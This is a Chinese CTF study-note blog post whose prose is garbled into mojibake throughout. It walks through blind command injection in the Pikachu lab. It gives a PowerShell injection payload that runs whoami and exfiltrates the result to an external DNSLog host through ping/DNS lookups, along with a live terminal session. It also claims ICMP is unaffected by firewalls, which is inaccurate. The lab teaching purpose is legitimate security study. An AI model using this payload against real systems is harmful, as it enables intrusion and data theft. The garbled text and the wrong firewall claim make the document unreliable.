---
title: 20250114CTFå­¦ä¹ ç¬”è®°40
date: 2025-01-14
tags:
 - CTF
 - CTFLearn
categories:
   - å‘½ç†å­¦ Numerology
isShowComments: true
publish: true




















---

<Boxx/>

ä»0å¼€å§‹å­¦ä¹ CTFï¼Œäº†è§£CTFåŸºæœ¬è§„åˆ™ã€æ–¹æ³•ï¼Œè¿™æ˜¯å¼€å§‹æ‰“å¡å­¦ä¹ çš„ç¬¬56å¤©

ä»Šæ—¥å†…å®¹ï¼šåŸºç¡€å…¥é—¨-åå¼¹SHELL&å¸¦å¤–æŸ¥è¯¢&æ­£åå‘è¿æ¥&é˜²ç«å¢™å‡ºå…¥ç«™&æ–‡ä»¶ä¸‹è½½

[[toc]]

- å°è¿ªå®‰å…¨è§†é¢‘åœ°å€ã€[ğŸ”—ä¼ é€é—¨]([https://www.bilibili.com/video/BV123yAYMEwb/)ã€‘

<!-- more -->

# ç¬¬24ç« ï¼šåŸºç¡€å…¥é—¨-åå¼¹SHELL&å¸¦å¤–æŸ¥è¯¢&æ­£åå‘è¿æ¥&é˜²ç«å¢™å‡ºå…¥ç«™&æ–‡ä»¶ä¸‹è½½

## é˜²ç«å¢™å‡ºå…¥ç«™

è¦æ§åˆ¶å¯¹æ–¹ï¼Œæ— éæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯ä¸»åŠ¨æ‰¾ä»–æ§åˆ¶ï¼Œå¦ä¸€ç§æ˜¯å¯¹é¢æŠŠæƒé™ç»™ä½ ã€‚çœ‹å“ªç§æ–¹å¼å¯è¾¾ã€‚

### å®é™…æ¡ˆä¾‹3ï¼šæ•°æ®ä¸å›æ˜¾-ICMPå¸¦å¤–æŸ¥è¯¢Dnslog

åœ¨ä¹‹å‰çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨æ‹¼æ¥å‘½ä»¤åæäº¤æ˜¯èƒ½å›æ˜¾çš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š

![image-20250114210150069](/img/ctfLearn/image-20250114210150069.png)

æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹æºç ï¼Œè®©ä»–ä¸å›æ˜¾ï¼Œæºç çš„è·¯å¾„å¦‚ä¸‹`C:\Tools\phpstudy_pro\WWW\pikachu\vul\rce\rce_ping.php`

![image-20250114210529887](/img/ctfLearn/image-20250114210529887.png)

æˆ‘ä»¬å°†è¿™è¡Œä»£ç æ³¨é‡Šæ‰ï¼Œ`echo`æ˜¯è¾“å‡ºçš„æ„æ€ã€‚phpä»£ç çš„æ³¨é‡Šç”¨çš„æ˜¯`//`

æ­¤æ—¶ä¸ç®¡æˆ‘ä»¬æ˜¯è¾“å…¥`127.0.0.1|whoami`è¿˜æ˜¯`127.0.0.1`ï¼Œéƒ½æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼š

![image-20250114210820722](/img/ctfLearn/image-20250114210820722.png)

#### **æ€»ç»“ï¼š**

å·²çŸ¥æœ‰æ¼æ´ï¼Œä½†æ˜¯æ•°æ®ä¸å›æ˜¾ï¼š

1. æˆ‘ä»¬å¯ä»¥å°è¯•åå¼¹Shellï¼Œå°†æƒé™ç›´æ¥ç»™å‡ºæ¥
2. æˆ‘ä»¬ä¹Ÿå¯ä»¥å¸¦å¤–æŸ¥è¯¢ï¼Œè®©ä»–ä¸»åŠ¨æŠŠç»“æœç»™å‡ºæ¥

#### **åŸç†ï¼š**

æ‰¾ä¸ªDNSLogå·¥å…·ï¼Œæ¯æ¬¡pingè¯¥åœ°å€å°±ä¼šå±•ç¤º`DNS Query Record`å³DNSæŸ¥è¯¢è®°å½•ã€IPåœ°å€ã€åˆ›å»ºæ—¶é—´ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š

![image-20250114214614505](/img/ctfLearn/image-20250114214614505.png)

æ­¤æ—¶æˆ‘ä»¬åœ¨pingå‘½ä»¤çš„åŸŸåä¸ŠåŠ ä¸Šå­åŸŸåï¼Œå¹¶ä¸”ç»™å­åŸŸååŠ ä¸Šåå¼•å·ï¼Œè®©åå¼•å·å†…éƒ¨å…ˆæ‰§è¡Œï¼ŒpingæˆåŠŸåå³å¯å¾—åˆ°ç»“æœï¼š

![image-20250114221541697](/img/ctfLearn/image-20250114221541697.png)

 ä½†æ˜¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬ç”¨çš„æ˜¯Linuxæ¥è¿›è¡Œçš„pingå‘½ä»¤ï¼Œè€Œä¸æ˜¯Windowsï¼Œè¦çŸ¥é“åœ¨Windowsä¸­ï¼Œcmdå‘½ä»¤é‡Œæ˜¯æ²¡æœ‰åå¼•å·å…ˆæ‰§è¡Œè¿™æ¡è§„å®šçš„ï¼Œæˆ‘ä»¬åªèƒ½å¦è¾Ÿè¹Šå¾„ï¼Œè¿™é‡Œç”¨åˆ°PowerShellæ¥æ‰§è¡Œå³å¯ï¼š

![image-20250114223734005](/img/ctfLearn/image-20250114223734005.png)

```
C:\Users\19854>powershell
Windows PowerShell
ç‰ˆæƒæ‰€æœ‰ (C) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚

å°è¯•æ–°çš„è·¨å¹³å° PowerShell https://aka.ms/pscore6

PS C:\Users\19854> $x=whoami
PS C:\Users\19854> echo $x
laptop-kl37dc4i\19854
PS C:\Users\19854> $x=whoami;$y='.northglory.eyes.sh';
PS C:\Users\19854> echo $x;
laptop-kl37dc4i\19854
PS C:\Users\19854> echo $y;
.northglory.eyes.sh
PS C:\Users\19854> echo $x+$y
laptop-kl37dc4i\19854+.northglory.eyes.sh
PS C:\Users\19854> $z=$x+$y;
PS C:\Users\19854> echo $z;
laptop-kl37dc4i\19854.northglory.eyes.sh
PS C:\Users\19854> ping $z;
Ping è¯·æ±‚æ‰¾ä¸åˆ°ä¸»æœº laptop-kl37dc4i\19854.northglory.eyes.shã€‚è¯·æ£€æŸ¥è¯¥åç§°ï¼Œç„¶åé‡è¯•ã€‚
PS C:\Users\19854> $x1=$x.replace('\','xxx');
PS C:\Users\19854> echo $x1;
laptop-kl37dc4ixxx19854
PS C:\Users\19854> $z=$x1+$y;
PS C:\Users\19854> echo $z;
laptop-kl37dc4ixxx19854.northglory.eyes.sh
PS C:\Users\19854> ping $z;

æ­£åœ¨ Ping laptop-kl37dc4ixxx19854.northglory.eyes.sh [172.104.163.125] å…·æœ‰ 32 å­—èŠ‚çš„æ•°æ®:
æ¥è‡ª 172.104.163.125 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´=107ms TTL=47
æ¥è‡ª 172.104.163.125 çš„å›å¤: å­—èŠ‚=32 æ—¶é—´=125ms TTL=47

172.104.163.125 çš„ Ping ç»Ÿè®¡ä¿¡æ¯:
    æ•°æ®åŒ…: å·²å‘é€ = 2ï¼Œå·²æ¥æ”¶ = 2ï¼Œä¸¢å¤± = 0 (0% ä¸¢å¤±)ï¼Œ
å¾€è¿”è¡Œç¨‹çš„ä¼°è®¡æ—¶é—´(ä»¥æ¯«ç§’ä¸ºå•ä½):
    æœ€çŸ­ = 107msï¼Œæœ€é•¿ = 125msï¼Œå¹³å‡ = 116ms
Control-C
PS C:\Users\19854>
```

ä¸€å¼€å§‹pingä¸é€šæ˜¯å› ä¸ºæœ‰åæ–œæ ï¼Œæˆ‘ä»¬ç”¨xxxæ›¿æ¢äº†åæ–œæ ï¼Œç„¶åé‡æ–°pingäº†ä¸€ä¸‹ï¼Œæ­¤æ—¶æŸ¥çœ‹DNSLogé¡µé¢ï¼Œå‘ç°å·²ç»æœ‰äº†è¿™æ¡è®°å½•ï¼š

![image-20250114223929523](/img/ctfLearn/image-20250114223929523.png)

æˆ‘ä»¬æ•´ç†ä¸€ä¸‹åˆšæ‰PowerShellçš„è¯­å¥ï¼š

```powershell
powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.northglory.eyes.sh';$z=$x+$y;ping $z;
```

#### **ä¸ºä»€ä¹ˆè¦è¿™æ ·å†™ï¼š**

1. å› ä¸ºCMDé‡Œæ— æ³•æ‰§è¡Œ`whoami`ï¼Œåœ¨pingå‘½ä»¤ä¸­ï¼Œæ— æ³•å®Œæˆåå¼•å·å…ˆæ‰§è¡Œï¼Œæ— æ³•è§£æwhoami

2. ç”¨åˆ°PowerShellå˜é‡èµ‹å€¼ï¼ŒæŠŠæ‰§è¡Œç»“æœç»™å˜é‡

3. åˆç”±äºç»“æœé‡Œå¸¦ç¬¦å·"\\"ï¼Œå¯¼è‡´pingæ— æ³•æ‰§è¡Œï¼Œæ‰€ä»¥è¦æ›¿æ¢åå¼•å·ä¸ºxxx

#### **æ­¥éª¤ï¼š**

1. é¦–å…ˆè¦è€ƒè™‘pikachuçš„è¿™ä¸ªpingæ¼æ´æ˜¯å¦èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ä»¥ä¸‹å†…å®¹å°è¯•å‘é€ï¼š

   ```
   127.0.0.1|ping northglory.eyes.io
   ```

2. çœ‹åˆ°DNSLogå¹³å°ä¸Šæœ‰å›æ˜¾ï¼Œè¯´æ˜æ˜¯èƒ½æ‰§è¡Œå‘½ä»¤ä¸”èƒ½pingé€šçš„ã€‚

3. ä½†ç”±äºæ˜¯Windowsç³»ç»Ÿçš„CMDæ˜¯æ²¡æœ‰åå¼•å·å…ˆæ‰§è¡Œè¿™æ¡è§„åˆ™çš„ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°PowerShellçš„å˜é‡èµ‹å€¼ï¼Œè®©`$x=whoami`ï¼Œè¿™å¥æ˜¯æ ¸å¿ƒï¼Œåè¾¹æ‹¼æ¥`.northglory.eyes.s`

4. æœ€åå‘ç°pingçš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‰§è¡Œå®Œ`whoami`çš„ç»“æœæœ‰ä¸ªåæ–œæ ï¼Œå¯¼è‡´pingå‘½ä»¤ä¸èƒ½æ‰§è¡Œäº†ï¼Œè¿™ç§æƒ…å†µåªè¦æŠŠ$xæ‰§è¡Œå®Œ`whoami`åå†æ›¿æ¢ä¸€ä¸‹åæ–œæ å³å¯ã€‚

#### **å®è·µï¼š**

ç”¨127.0.0.1å’Œåˆšæ‰çš„PowerShellå‘½ä»¤åšæ‹¼æ¥ï¼Œç„¶åæ”¾åˆ°pikachuçš„æ¼æ´ä¸­å»å®éªŒï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š

```powershell
127.0.0.1|powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.northglory.eyes.sh';$z=$x+$y;ping $z;
```

å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬åœ¨pikachuä¸­ç‚¹å‡»æäº¤ä»¥åï¼ŒæˆåŠŸpingåˆ°äº†DNSlogå¹³å°ï¼Œè®°å½•ä¸­å±•ç¤ºäº†`whoami`çš„ç»“æœ

![image-20250114230040633](/img/ctfLearn/image-20250114230040633.png)

#### **æ³¨æ„ï¼š**

ä»”ç»†é˜…è¯»åˆšæ‰çš„PowerShellä»£ç ï¼Œè¦ç†è§£ä»£ç çš„æ‰§è¡Œé¡ºåºï¼Œå…ˆæ˜¯`$x=whoami`çš„æ—¶å€™ï¼Œå°±å·²ç»æˆåŠŸæ‰§è¡Œäº†ï¼Œç„¶åæ‰åšçš„æ›¿æ¢ï¼Œæ‰€ä»¥DNSLogæœ‰äº†åè¾¹æˆ‘ä»¬çš„ç»“æœã€‚

åŒç†ï¼Œæˆ‘ä»¬ä¸åªæ˜¯å¯ä»¥æ‰§è¡Œ`whoami`ï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šå‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œæ¯”å¦‚`dir`æ˜¯æŸ¥çœ‹ç›®å½•ã€‚

#### **æ€è€ƒï¼š**

æ›¾ç»é‡åˆ°è¿‡Pingçš„CTFé¢˜ç›®ï¼Œä½†å½“æ—¶ç¯å¢ƒæ²¡æœ‰äº’è”ç½‘ï¼Œåªèƒ½Pingæœ¬åœ°ï¼Œä¹Ÿå°±æ˜¯127.0.0.1ä¹‹ç±»çš„åœ°å€ï¼Œå¯èƒ½è¿™ç§å°±ä¸èƒ½ç”¨ä»¥ä¸Šçš„æ–¹æ³•äº†ã€‚åªèƒ½ç”¨ç®¡é“ç¬¦è¿™ç§æœ€åŸºç¡€çš„å‘½ä»¤æ‹¼æ¥çš„å½¢å¼ï¼Œç”¨ä¸åˆ°åå¼¹Shellå’ŒDNSLogå¸¦å¤–å›æ˜¾äº†ã€‚

#### **ç½‘ç»œåè®®ï¼š**

ç”¨åå¼¹Shelléœ€è¦è€ƒè™‘é˜²ç«å¢™çš„é—®é¢˜ï¼Œä½†Pingçš„è§£æï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨PowerShellå’ŒDNSlogåšå¸¦å¤–å›æ˜¾èƒ½ç»•è¿‡é˜²ç«å¢™

**åŸå› ï¼š**pingå‘½ä»¤èµ°çš„ICMPåè®®ï¼Œè€Œé˜²ç«å¢™ç¦ç”¨ç«¯å£æ˜¯æ§åˆ¶TCP/UDPåè®®ï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶ä¼ è¾“å±‚ï¼Œä½†æ˜¯ICMPæ˜¯ç½‘ç»œå±‚ï¼Œæ˜¯ä¼ è¾“å±‚ä¸‹å±‚ï¼Œä¸å—é˜²ç«å¢™å½±å“ã€‚æ‰€ä»¥å¯ä»¥ä½¿ç”¨pingå‘½ä»¤å°†æ•°æ®å¸¦å‡ºã€‚

![image-20250114232219279](/img/ctfLearn/image-20250114232219279.png)


> **è¯¾å¤–çŸ¥è¯†ï¼š**
>
> åœ¨è¿æ¥äº’è”ç½‘çš„æƒ…å†µä¸‹ï¼Œä¸ç®¡Windowsç³»ç»Ÿè¿˜æ˜¯Linuxç³»ç»Ÿéƒ½å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢äº’è”ç½‘IPåœ°å€
>
> ```shell
> curl ifconfig.me
> ```
>
> **å®‰è£…æœ¬åœ°å·¥å…·ï¼š**
>
> YAKITï¼ˆYet Another Knife for IT Securityï¼‰ã€[å®˜æ–¹ç½‘ç«™](https://yaklang.com/)ã€‘æ˜¯ä¸€æ¬¾ç½‘ç»œå®‰å…¨å•å…µå·¥å…·ï¼Œä¸“ä¸ºä¸ªäººæ¸—é€æµ‹è¯•å‘˜å’Œå®‰å…¨ç ”ç©¶äººå‘˜è®¾è®¡ã€‚å®ƒæ•´åˆäº†ä¸€ç³»åˆ—å®ç”¨çš„å®‰å…¨å·¥å…·ï¼Œä¾‹å¦‚å¯†ç ç ´è§£å·¥å…·ã€ç½‘ç»œæ‰«æå™¨ã€æ¼æ´åˆ©ç”¨å·¥å…·ç­‰ï¼Œå¸®åŠ©ç”¨æˆ·åœ¨ä¸€ä¸ªé›†ä¸­åŒ–çš„ç•Œé¢ä¸‹æ‰§è¡Œå¸¸è§çš„æ¸—é€æµ‹è¯•ä»»åŠ¡ã€‚YAKITé€šå¸¸è½»ä¾¿ä¸”æ˜“äºæºå¸¦ï¼Œæ–¹ä¾¿åœ¨éœ€è¦å¿«é€Ÿå“åº”çš„åº”æ€¥ç¯å¢ƒä¸­ä½¿ç”¨ã€‚
>



## æ€ç»´å¯¼å›¾

![image-20250119230234742](/img/ctfLearn/image-20250119230234742.png)